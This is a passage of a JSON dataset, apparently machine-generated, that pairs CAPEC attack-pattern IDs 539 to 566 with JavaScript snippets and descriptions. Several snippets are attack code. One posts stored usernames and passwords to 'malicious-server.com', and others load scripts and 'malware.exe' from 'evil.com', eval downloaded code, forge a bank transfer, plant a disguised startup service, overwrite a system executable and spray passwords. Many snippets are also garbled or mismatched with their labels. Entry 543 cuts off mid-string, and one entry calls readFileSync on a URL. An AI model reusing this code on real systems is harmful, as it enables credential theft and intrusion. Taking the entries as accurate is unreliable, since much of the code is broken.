        "description": "This JavaScript code snippet downloads a malicious library from a remote location without verifying its integrity, and then executes it using the eval function, allowing the malicious code to potentially compromise the system."
    },
    {
        "capec_id": "539",
        "code_snippet": "const debugMode = true;\n\nif (debugMode) {\n  console.log('Debug mode enabled');\n  const sensitiveSystemInfo = getSystemInformation();\n  console.log(sensitiveSystemInfo);\n}\n\nfunction getSystemInformation() {\n  const securityToken = 'insecureToken';\n  const securityIdentifier = 'insecureIdentifier';\n  if (securityToken === 'insecureToken' && securityIdentifier === 'insecureIdentifier') {\n    return {\n      'systemConfig': 'unprotectedConfig',\n      'securitySettings': 'unprotectedSettings'\n    };\n  } else {\n    return 'Access denied';\n  }\n}\n\n// Embedded malicious code\nfunction maliciousFunction() {\n  const maliciousCode = 'maliciousCode';\n  eval(maliciousCode);\n}",
        "description": "This code snippet demonstrates the CAPEC of inserting malicious functionality into an ASIC during development. It includes CWE-506 Embedded Malicious Code, CWE-497 Exposure of Sensitive System Information, CWE-11 ASP.NET Misconfiguration, CWE-1294 Insecure Security Identifier Mechanism, and CWE-1259 Improper Restriction of Security Token Assignment. The code enables debug mode, exposing sensitive system information and allowing unauthorized access. It also includes an embedded malicious function that can be executed, and insecure security tokens and identifiers that can be exploited."
    },
    {
        "capec_id": "540",
        "code_snippet": "function vulnerableFunction(buffer) {\n    var outputBuffer = new Buffer(10);\n    outputBuffer.write(buffer, 0, buffer.length);\n    return outputBuffer.toString('utf8', 0, outputBuffer.length);\n}\n\n// Example usage:\nvar userInput = 'A'.repeat(20);\nvulnerableFunction(userInput);\n",
        "description": "This JavaScript code snippet demonstrates a buffer over-read vulnerability. The `vulnerableFunction` takes a user-input buffer and writes it to an output buffer without checking the size of the input buffer. This can lead to reading data past the end of the intended buffer, resulting in a buffer over-read. The example usage shows how an attacker can exploit this vulnerability by providing a large input buffer, causing the function to read beyond the boundary of the output buffer."
    },
    {
        "capec_id": "541",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/version', (req, res) => {\n  if (req.header('User-Agent').includes('Chrome')) {\n    res.status(200).send('Application version: 1.2.3');\n  } else if (req.header('User-Agent').includes('Firefox')) {\n    res.status(200).send('Application version: 1.2.4');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\napp.get('/api/data', (req, res) => {\n  if (req.query.apiKey === 'validKey') {\n    setTimeout(() => {\n      res.status(200).send('Data retrieved successfully');\n    }, 2000);\n  } else {\n    res.status(401).send('Invalid API key');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable API that can be fingerprinted by an adversary. The API responds differently based on the User-Agent header, revealing internal state information (CWE-204). The API also takes different amounts of time to respond to requests based on the validity of the API key, revealing security-relevant information (CWE-208). Additionally, the API key is passed as a query parameter, making it visible to unauthorized actors (CWE-214)."
    },
    {
        "capec_id": "542",
        "code_snippet": "const maliciousCode = `const systemInfo = getSystemInformation(); const sensitiveData = getSensitiveData(); const malware = createMalware(systemInfo, sensitiveData); malware.replicate();`;\n\nfunction getSystemInformation() {\n  const systemDetails = {\n    os: navigator.userAgent,\n    browser: navigator.appCodeName,\n    plugins: Object.keys(navigator.plugins).map(plugin => navigator.plugins[plugin].name),\n  };\n  return systemDetails;\n}\n\nfunction getSensitiveData() {\n  const userData = {\n    username: localStorage.getItem('username'),\n    password: localStorage.getItem('password'),\n  };\n  return userData;\n}\n\nfunction createMalware(systemInfo, sensitiveData) {\n  const malware = {\n    replicate: function() {\n      // Replicate malware to other systems\n      const xhr = new XMLHttpRequest();\n      xhr.open('POST', 'https://malicious-server.com/replicate', true);\n      xhr.send(JSON.stringify({ systemInfo, sensitiveData }));\n    },\n    spy: function() {\n      // Collect user data without consent\n      const userData = getSensitiveData();\n      const xhr = new XMLHttpRequest();\n      xhr.open('POST', 'https://malicious-server.com/collect', true);\n      xhr.send(JSON.stringify(userData));\n    },\n  };\n  return malware;\n}",
        "description": "This JavaScript code snippet demonstrates a malicious code that takes advantage of a known vulnerability in an organizational IT environment. It gathers system information and sensitive user data, creates a malware that replicates to other systems, and collects user data without consent, embodying CWEs 506, 497, 509, 507, and 512."
    },
    {
        "capec_id": "543",
        "code_snippet": "const maliciousSite = 'https://evil.com';\n\nfunction downloadMalware() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', 'https://evil.com/malware.exe', true);\n  xhr.responseType = 'arraybuffer';\n  xhr.onload = function() {\n    if (xhr.status === 200) {\n      const blob = new Blob([xhr.response], { type: 'application/octet-stream' });\n      const link = document.createElement('a');\n      link.href = window.URL.createObjectURL(blob);\n      link.download = 'malware.exe';\n      link.click();\n    }\n  };\n  xhr.send();\n}\n\nfunction csrfAttack() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://bank.com/transfer', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('amount=1000&recipient=attacker');\n}\n\nfunction redirect() {\n  window.location.href = 'https://evil.com/phishing?redirect=' + encodeURIComponent('https://bank.com');\n}\n\n// Replicating malicious code\nfunction virus() {\n  const script = document.createElement('script');\n  script.src = 'https://evil.com/maliciousCode.js';\n  document.body.appendChild(script);\n}\n\n// Embedded malicious code\nfunction embeddedMalware() {\n  eval('const maliciousCode = \\'alert(\\",
        "description": "This JavaScript code snippet demonstrates a phishing attack by replicating a legitimate website and gathering user information or uploading malware. It uses various CWEs, including Replicating Malicious Code (CWE-509), Cross-Site Request Forgery (CWE-352), Download of Code Without Integrity Check (CWE-494), URL Redirection to Untrusted Site ('Open Redirect') (CWE-601), and Embedded Malicious Code (CWE-506). The code downloads malware, performs a CSRF attack, redirects to a phishing site, replicates malicious code, and embeds malicious code."
    },
    {
        "capec_id": "544",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'malicious-supplier.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    const maliciousComponent = JSON.parse(data);\n    // Inject malicious component into the organizational supply chain\n    injectComponent(maliciousComponent);\n  });\n});\n\nreq.on('error', (error) => {\n  console.error(error);\n});\n\nreq.end();\n\nfunction injectComponent(component) {\n  // Create a new, distinct resource that can be used by attackers\n  const emergentResource = createResource(component);\n  // Use the emergent resource to initiate an outgoing request to an actor\n  const actor = getActor();\n  sendRequestToActor(actor, emergentResource);\n}\n\nfunction createResource(component) {\n  // Rely on security through obscurity by using a weak encryption algorithm\n  const weaklyEncryptedComponent = encryptComponent(component, 'weakKey');\n  return weaklyEncryptedComponent;\n}\n\nfunction sendRequestToActor(actor, resource) {\n  // Incorrectly specify the intended destination for the actor\n  const incorrectDestination = 'http://incorrect-destination.com';\n  const request = https.request(incorrectDestination, (res) => {\n    // Observable behavioral discrepancy with equivalent products\n    console.log('Sending request to ' + incorrectDestination);\n  });\n  request.write(resource);\n  request.end();\n}",
        "description": "This code snippet demonstrates the CAPEC by creating a false front organization that injects corrupted/malicious information system components into the organizational supply chain. It uses the related CWEs by: (1) not validating the certificate of the malicious supplier (CWE-295), (2) behaving differently than other products with equivalent functionality (CWE-207), (3) creating a new, distinct resource that can be used by attackers (CWE-1229), (4) relying on security through obscurity by using a weak encryption algorithm (CWE-656), and (5) incorrectly specifying the intended destination for the actor (CWE-941)."
    },
    {
        "capec_id": "545",
        "code_snippet": "const fs = require('fs');\nconst debugMode = true;\nconst sensitiveInfo = 'secretKey';\n\n// CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\nif (debugMode) {\n  console.log('Debug mode enabled. Sensitive info: ' + sensitiveInfo);\n} else {\n  // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n  // Insecurely 'clearing' sensitive data\n  sensitiveInfo = null;\n}\n\n// CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\nfunction transitionToDebugMode() {\n  // No proper clearing of sensitive information\n  console.log('Transitioning to debug mode...');\n}\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nconst traceData = {\n  'sensitiveInfo': sensitiveInfo\n};\nfs.writeFileSync('trace_data.json', JSON.stringify(traceData));\n\n// CWE-1330: Remanent Data Readable after Memory Erase\nfunction eraseMemory() {\n  // Insecurely 'erasing' memory\n  sensitiveInfo = undefined;\n}\n",
        "description": "This code snippet demonstrates the CAPEC pattern of an adversary searching system resources to gather useful information. It includes vulnerabilities related to improper clearing of sensitive information, exposure of sensitive system information, and improper management of sensitive trace data. The code showcases insecure practices such as logging sensitive information in debug mode, improperly clearing sensitive data, and storing sensitive trace data in an unprotected location."
    },
    {
        "capec_id": "546",
        "code_snippet": "const storage = {\n  'user1': 'password123',\n  'user2': 'ilovepuppies'\n};\n\nfunction allocateResourceToNewTenant(oldTenant, newTenant) {\n  // Insecurely 'delete' old tenant's data\n  delete storage[oldTenant];\n  // Allocate resource to new tenant without properly clearing data\n  storage[newTenant] = 'new_data';\n}\n\nallocateResourceToNewTenant('user1', 'attacker');\n\n// Attacker can now access sensitive information from old tenant\nconsole.log(storage);",
        "description": "This code snippet demonstrates the CAPEC where an adversary obtains unauthorized information due to insecure or incomplete data deletion in a multi-tenant environment. The 'allocateResourceToNewTenant' function deletes the old tenant's data but does not properly clear the storage, allowing the new tenant (in this case, an attacker) to access sensitive information from the old tenant."
    },
    {
        "capec_id": "547",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.data = 'sensitive information';\n  }\n\n  deleteData() {\n    // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n    this.data = null;\n  }\n\n  destroySelf() {\n    // CWE-1082: Class Instance Self Destruction Control Element\n    this.deleteData();\n    delete this;\n  }\n\n  virtualMethod() {\n    // CWE-1087: Class with Virtual Method without a Virtual Destructor\n    console.log('Virtual method called');\n  }\n}\n\nconst hwComponent = new HardwareComponent();\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nhwComponent.destroySelf();\n\n// CWE-1300: Improper Protection of Physical Side Channels\n// Assume the hardware component has a physical side channel that exposes sensitive information\n// through power consumption patterns\nfunction injectError() {\n  // Simulate an unauthorized error injection\n  hwComponent.data = 'tampered data';\n}\ninjectError();",
        "description": "This code snippet demonstrates a vulnerable hardware component class that can be physically attacked and destroyed. The class has a method to delete its sensitive data, but it does not completely remove the data. The class also has a virtual method without a virtual destructor, making it vulnerable to errors. Additionally, the class can be destroyed by an unauthorized agent, which can inject errors into the system and degrade its redundancy. The code also simulates an unauthorized error injection that can expose sensitive information through physical side channels."
    },
    {
        "capec_id": "548",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveInfo = 'TopSecretInformation';\n  res.send(sensitiveInfo);\n});\n\napp.post('/storeData', (req, res) => {\n  const data = req.body;\n  fs.writeFileSync('data.txt', JSON.stringify(data));\n  res.send('Data stored successfully');\n});\n\napp.get('/reuseResource', (req, res) => {\n  const fileBuffer = fs.readFileSync('data.txt');\n  const reusedData = fileBuffer.toString();\n  res.send(reusedData);\n});",
        "description": "This code snippet demonstrates the CAPEC of contaminating an information system by handling sensitive information without proper authorization. It uses CWE-319 by transmitting sensitive information in cleartext, CWE-212 by storing sensitive information without proper removal, CWE-226 by reusing a resource without clearing sensitive information, CWE-922 by storing sensitive information without proper access control, and CWE-402 by making private resources available to untrusted parties. The code creates an Express.js server that sends sensitive information in response to a GET request, stores user-input data in a file without proper sanitization, and reuses the stored data without clearing it, making it available to unauthorized actors."
    },
    {
        "capec_id": "549",
        "code_snippet": "const fs = require('fs');\nconst net = require('net');\n\nconst downloadAndExecute = () => {\n  const remoteCodeUrl = 'http://malicious-website.com/maliciousCode.js';\n  const remoteCode = fs.readFileSync(remoteCodeUrl);\n  const maliciousFunction = eval(remoteCode);\n  maliciousFunction();\n};\n\nconst nestedInvocation = () => {\n  const nonReentrantCode = () => {\n    while (true) {\n      nestedInvocation();\n    }\n  };\n  nonReentrantCode();\n};\n\nconst optimizeAndModify = () => {\n  const securityCriticalCode = () => {\n    // Original security-critical code\n    const passwordHash = 'hashedPassword';\n    return passwordHash;\n  };\n  const optimizedCode = securityCriticalCode.toString().replace('hashedPassword', 'crackedPassword');\n  eval(optimizedCode);\n};\n\n// Inclusion of functionality from untrusted control sphere\nconst untrustedLibrary = require('untrusted-library');\nconst maliciousFunctionFromLibrary = untrustedLibrary.maliciousFunction;\nmaliciousFunctionFromLibrary();\n\n// Download of code without integrity check\nconst downloadCode = () => {\n  const codeUrl = 'http://malicious-website.com/maliciousCode.js';\n  const code = fs.readFileSync(codeUrl);\n  eval(code);\n};\ndownloadCode();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of installing and executing malicious code on a target system. It includes various CWEs, such as CWE-829 (inclusion of functionality from untrusted control sphere), CWE-506 (embedded malicious code), CWE-494 (download of code without integrity check), CWE-1265 (unintended reentrant invocation of non-reentrant code), and CWE-1037 (processor optimization removal or modification of security-critical code). The code downloads and executes malicious code from a remote location, includes functionality from an untrusted library, and optimizes and modifies security-critical code."
    },
    {
        "capec_id": "550",
        "code_snippet": "const exec = require('child_process').exec;\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\n// CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\nconst serviceName = 'WindowsUpdateSvc';\nconst servicePath = 'C:\\\\Windows\\\\System32\\\\svchost.exe';\n\n// CWE-1392: Use of Default Credentials\nconst defaultCredential = 'password123';\n\n// CWE-1188: Initialization of a Resource with an Insecure Default\nconst insecureDefaultConfig = {\n  'username': 'admin',\n  'password': defaultCredential\n};\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nconst impersonationLevel = 'Identify';\n\n// Create a new service with elevated privileges\nexec(`sc create ${serviceName} binPath= ${servicePath} obj= .\\\\${insecureDefaultConfig.username}:${insecureDefaultConfig.password}`);\n\n// Configure the service to run at startup\nfs.writeFileSync('C:\\\\Windows\\\\System32\\\\config\\\\system', `\\[HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\services\\\\${serviceName}]\\nStart= 2`);",
        "description": "This JavaScript code snippet demonstrates the CAPEC of installing a new service that will be executed at startup, disguising it with a legitimate service name. The code uses default credentials, improper access control, and insecure defaults, and allows impersonation, making it vulnerable to various attacks."
    },
    {
        "capec_id": "551",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmodSync('/etc/init.d/service', '0777');\n\n// CWE-522: Insufficiently Protected Credentials\nconst credentials = { username: 'admin', password: 'password' };\nfs.writeFileSync('/etc/service.conf', `username=${credentials.username}&password=${credentials.password}`);\n\n// CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\nexec('service untrusted_core start');\n\n// CWE-15: External Control of System or Configuration Setting\nconst userInput = 'malicious_input';\nfs.writeFileSync('/etc/service.conf', userInput);\n\n// CWE-908: Use of Uninitialized Resource\nlet uninitializedVariable;\nfs.readFile('/etc/service.conf', (err, data) => {\n  uninitializedVariable = data;\n  console.log(uninitializedVariable);\n});",
        "description": "This code snippet demonstrates the CAPEC of modifying existing services or enabling disabled services by exploiting various CWEs. It starts by changing the permissions of a service configuration file to allow unauthorized access (CWE-284). Then, it stores credentials in plain text in a configuration file, making them susceptible to interception (CWE-522). The code then starts an untrusted execution core before enabling fabric access control (CWE-1193). It also allows external control of system settings by writing user input to a configuration file (CWE-15). Finally, it uses an uninitialized variable to read a configuration file, which can lead to unexpected behavior (CWE-908)."
    },
    {
        "capec_id": "552",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSystemInfo() {\n  const userInput = document.getElementById('inputField').value;\n  const command = `systeminfo ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n}\n\ngetSystemInfo();",
        "description": "This JavaScript code snippet demonstrates a vulnerability to OS Command Injection (CWE-78) and Exposure of Sensitive System Information to an Unauthorized Control Sphere (CWE-497). The code takes user input and uses it to construct an OS command to retrieve system information. An attacker could inject malicious commands to gain unauthorized access to sensitive system information or even install malware (CWE-506, CWE-507). The code also lacks proper access control (CWE-284), allowing an unauthorized actor to access system information."
    },
    {
        "capec_id": "554",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/admin', (req, res) => {\n  if (req.body.password === 'admin') {\n    // Client-side validation, can be easily bypassed\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.post('/admin/bypass', (req, res) => {\n  // Alternate path to access restricted functionality\n  res.send('Bypassed!');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js Express.js application that relies on client-side validation to protect the /admin endpoint. An attacker can bypass this protection by sending a request to the /admin/bypass endpoint, which is not properly protected. This code embodies the CAPEC of bypassing protection mechanisms, and is related to CWEs 424, 1299, 695, 693, and 602."
    },
    {
        "capec_id": "555",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password123'\n});\n\nconnection.connect();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  connection.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send({ message: 'Error logging in' });\n    } else if (results.length > 0) {\n      res.send({ message: 'Logged in successfully' });\n    } else {\n      res.status(401).send({ message: 'Invalid credentials' });\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that uses single-factor authentication with weak password requirements and stores credentials in plaintext. The MySQL connection uses a hardcoded username and password, and the login query is vulnerable to SQL injection. The password is not hashed or salted, and there is no mechanism for password aging or expiration. This code is susceptible to unauthorized access and credential theft."
    },
    {
        "capec_id": "556",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-284: Improper Access Control\n// CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n// CWE-73: External Control of File Name or Path\nfunction openFile(file) {\n  const fileExtension = path.extname(file);\n  const handler = getHandlerForExtension(fileExtension);\n  if (handler) {\n    const childProcess = require('child_process');\n    childProcess.exec(handler + ' ' + file);\n  }\n}\n\n// CWE-64: Windows Shortcut Following (.LNK)\nfunction getHandlerForExtension(extension) {\n  const handlers = {\n    '.txt': 'notepad.exe',\n    '.pdf': 'acroread.exe',\n    '.lnk': 'rundll32.exe' // vulnerable to Windows Shortcut Following\n  };\n  return handlers[extension];\n}\n\n// CWE-910: Use of Expired File Descriptor\nfunction closeFile(fileDescriptor) {\n  fs.close(fileDescriptor, () => {\n    // file descriptor is closed, but still accessible\n    fs.read(fileDescriptor, (err, data) => {\n      console.log(data); // using expired file descriptor\n    });\n  });\n}\n\nopenFile('malicious.lnk');",
        "description": "This code snippet demonstrates a vulnerable file handler system in Node.js. The `openFile` function takes a file path as input and determines the file handler based on the file extension. The file handler is then used to open the file using the `child_process` module. The `getHandlerForExtension` function is vulnerable to Windows Shortcut Following (.LNK) and returns a handler for a given file extension. The `closeFile` function demonstrates the use of an expired file descriptor. An attacker can exploit this vulnerability by creating a malicious file with a .lnk extension that points to a malicious executable, which will be executed when the file is opened."
    },
    {
        "capec_id": "557",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('aes-256-cbc', 'my_secret_key');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction decryptData(encryptedData) {\n  const decipher = crypto.createDecipher('aes-256-cbc', 'my_secret_key');\n  let decrypted = decipher.update(encryptedData, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n}\n\n// Using an obsolete function\nconst fs = require('fs');\nfs.writeFileSync('data.txt', encryptData('my_secret_data'), 'utf8');\n\n// Reliance on runtime component in generated code\nconst runtimeComponent = require('runtime-component');\nconst generatedCode = runtimeComponent.generateCode();\n\n// Failure to provide confidentiality for stored data\nconst storedData = 'my_secret_data';\nconsole.log(storedData);\n\n// State synchronization error\nlet state = 'initialized';\nfunction changeState() {\n  state = 'changed';\n}\nchangeState();\nconsole.log(state);",
        "description": "This code snippet demonstrates a deprecated CAPEC that is not directly related to a weakness, social engineering, supply chains, or a physical-based attack. It incorporates multiple CWEs, including CWE-217 (Failure to Protect Stored Data from Modification), CWE-477 (Use of Obsolete Function), CWE-373 (State Synchronization Error), CWE-218 (Failure to provide confidentiality for stored data), and CWE-1101 (Reliance on Runtime Component in Generated Code). The code uses deprecated functions, fails to protect stored data from modification, and has state synchronization errors, making it vulnerable to various attacks."
    },
    {
        "capec_id": "558",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('child_process');\n\nconst userInput = 'malicious_command'; // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n\nfs.writeFile('/usr/bin/trusted_executable', userInput, (err) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n  console.log('Malicious executable replaced trusted executable.');\n});\n\nchildProcess.exec('chmod +x /usr/bin/trusted_executable', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});\n\n// CWE-284: Improper Access Control - The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor.\n// CWE-114: Process Control - Executing commands or loading libraries from an untrusted source or in an untrusted environment can cause an application to execute malicious commands (and payloads) on behalf of an attacker.\n// CWE-733 and CWE-1037 are not directly applicable in this JavaScript code snippet, but they are related to compiler and processor optimization removal or modification of security-critical code.",
        "description": "This JavaScript code snippet demonstrates the CAPEC of replacing a trusted executable with a malicious version, exploiting weaknesses in privilege management or access control. The code uses the 'fs' module to write a malicious command to a file, replacing the trusted executable, and then uses the 'childProcess' module to execute the malicious executable with elevated privileges. This code embodies CWE-284, CWE-78, and CWE-114, and is related to CWE-733 and CWE-1037."
    },
    {
        "capec_id": "559",
        "code_snippet": "const satelliteChannel = {\n  'transmit': (data) => {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    const sender = getSender();\n    if (!verifySender(sender)) {\n      console.log('Unverified sender!');\n      return;\n    }\n\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n    const message = encryptData(data);\n    sendToSatellite(message);\n  },\n\n  'receive': (message) => {\n    // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    const endpoint = getEndpoint();\n    if (!verifyEndpoint(endpoint)) {\n      console.log('Unintended endpoint!');\n      return;\n    }\n\n    // CWE-927: Use of Implicit Intent for Sensitive Communication\n    const implicitIntent = getImplicitIntent();\n    if (!verifyImplicitIntent(implicitIntent)) {\n      console.log('Implicit intent not verified!');\n      return;\n    }\n\n    // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n    const protectedRegion = getProtectedRegion();\n    if (!verifyProtectedRegion(protectedRegion)) {\n      console.log('Protected region overlap!');\n      return;\n    }\n\n    console.log('Message received and verified!');\n  }\n};",
        "description": "This JavaScript code snippet demonstrates a vulnerable satellite communication system that embodies the main idea of the CAPEC. It includes multiple CWEs, such as improper verification of the communication channel's source, lack of message integrity enforcement, improper restriction of the communication channel to intended endpoints, use of implicit intent for sensitive communication, and fabric-address map allowing unwarranted overlaps of protected and unprotected ranges. The code is intentionally written to be vulnerable to attacks, highlighting the importance of secure coding practices."
    },
    {
        "capec_id": "560",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'admin': 'password123',\n  'user': 'password123'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that uses single-factor authentication with a weak password storage mechanism. The passwords are stored in plaintext in a JavaScript object, making it susceptible to unauthorized access. The system also lacks any form of password aging, brute-force protection, or secure transmission of credentials, making it vulnerable to various attacks."
    },
    {
        "capec_id": "561",
        "code_snippet": "const adminUsername = 'admin';\nconst adminPassword = 'password123';\n\nfunction authenticateAdmin() {\n  if (username === adminUsername && password === adminPassword) {\n    // Grant access to Windows Admin Shares\n    console.log('Access granted');\n  } else {\n    console.log('Invalid credentials');\n  }\n}\n\n// Store credentials in plaintext\nconst credentials = {\n  username: adminUsername,\n  password: adminPassword\n};\n\n// Use single-factor authentication\nfunction login(username, password) {\n  if (username === adminUsername && password === adminPassword) {\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// Use weak password requirements\nfunction validatePassword(password) {\n  if (password.length > 5) {\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// No password aging mechanism\nfunction checkPasswordExpiration() {\n  return true;\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC of an adversary guessing or obtaining legitimate Windows administrator credentials to access Windows Admin Shares. The code uses CWE-522 by storing credentials in plaintext, CWE-308 by using single-factor authentication, CWE-309 by relying on a password system for primary authentication, CWE-294 by being vulnerable to capture-replay attacks, CWE-263 by not having a password aging mechanism, CWE-262 by not using password aging, and CWE-521 by having weak password requirements."
    },
    {
        "capec_id": "562",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\nconst path = require('path');\n\napp.post('/upload', (req, res) => {\n  const file = req.files.file;\n  const tempPath = path.join(__dirname, file.name);\n  fs.writeFileSync(tempPath, file.data);\n  res.send(`File uploaded successfully!`);\n});\n\napp.get('/download', (req, res) => {\n  const filePath = path.join(__dirname, 'user-uploaded-file.js');\n  res.download(filePath);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js server that allows unrestricted file uploads and downloads without integrity checks. The server uses the Express.js framework and allows users to upload files to a shared location. The uploaded files are stored in the server's file system with insecure permissions, making them accessible to unauthorized actors. The server also allows users to download the uploaded files without verifying their origin and integrity, which can lead to the execution of malicious code. This code embodies the CAPEC of manipulating files in a shared location and the related CWEs of improper access control, creation of temporary files with insecure permissions, unrestricted upload of files with dangerous types, download of code without integrity checks, and unparsed raw web content delivery."
    },
    {
        "capec_id": "563",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.post('/upload', (req, res) => {\n  let file = req.files.file;\n  let filePath = './uploads/' + file.name;\n  fs.writeFileSync(filePath, file.data);\n  res.send('File uploaded successfully!');\n});\n\napp.get('/uploads/:file', (req, res) => {\n  let file = req.params.file;\n  let filePath = './uploads/' + file;\n  res.sendFile(filePath);\n});",
        "description": "This code snippet demonstrates a vulnerable web server that allows an adversary to upload malicious content to the server through an open file share. The uploaded file can then be accessed and executed by the web server, potentially leading to local system or administrative privileges. The code is vulnerable to CWE-284 (Improper Access Control), CWE-219 (Storage of File with Sensitive Data Under Web Root), CWE-433 (Unparsed Raw Web Content Delivery), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), and CWE-494 (Download of Code Without Integrity Check)."
    },
    {
        "capec_id": "564",
        "code_snippet": "const net = require('net');\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\n// CWE-603: Use of Client-Side Authentication\n// CWE-520: .NET Misconfiguration: Use of Impersonation\n// CWE-798: Use of Hard-coded Credentials\n// CWE-259: Use of Hard-coded Password\n\nconst hardcodedUsername = 'admin';\nconst hardcodedPassword = 'password123';\n\nfs.writeFile('C:\\Windows\\System32\\logonscript.bat', `@echo off\nnet use \\\\remote_share /user:${hardcodedUsername} ${hardcodedPassword}\n`, (err) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log('Logon script modified.');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC by modifying a logon script to insert malicious code, allowing an adversary to maintain persistence or move laterally within an enclave. The code uses hard-coded credentials and improper access control, bypassing workstation and enclave firewalls. The script writes a batch file to the system directory, which will be executed on user logon, using the hard-coded credentials to access a remote share."
    },
    {
        "capec_id": "565",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nconst passwords = ['password123', 'qwerty', 'letmein'];\n\nfor (let i = 0; i < passwords.length; i++) {\n  for (let j = 0; j < users.length; j++) {\n    try {\n      // Attempt to login with the current password\n      login(users[j], passwords[i]);\n      console.log(`Login successful for ${users[j]} with password ${passwords[i]}`);\n      break;\n    } catch (e) {\n      console.log(`Login failed for ${users[j]} with password ${passwords[i]}`);\n    }\n  }\n  // Wait for a short period of time to avoid lockout\n  await new Promise(resolve => setTimeout(resolve, 1000));\n}",
        "description": "This JavaScript code snippet demonstrates a password spraying attack, where a list of common passwords is tried against a list of user accounts. The code does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame, and relies on single-factor authentication using passwords. The code also does not enforce strong password requirements, password aging, or account lockout policies, making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "566",
        "code_snippet": "const crypto = require('crypto');\n\nfunction hashPassword(password) {\n  const hash = crypto.createHash('sha256');\n  hash.update(password);\n  return hash.digest('hex');\n}\n\nfunction authenticate(username, password) {\n  const storedHash = getUserHashFromDatabase(username);\n  const inputHash = hashPassword(password);\n  if (inputHash === storedHash) {\n    return true;\n  } else {\n    return false;\n  }\n}\n\n// Example usage:\nconst username = 'johnDoe';\nconst password = 'mysecretpassword';\nif (authenticate(username, password)) {\n  console.log('Authentication successful!');\n} else {\n  console.log('Authentication failed!');\n}",
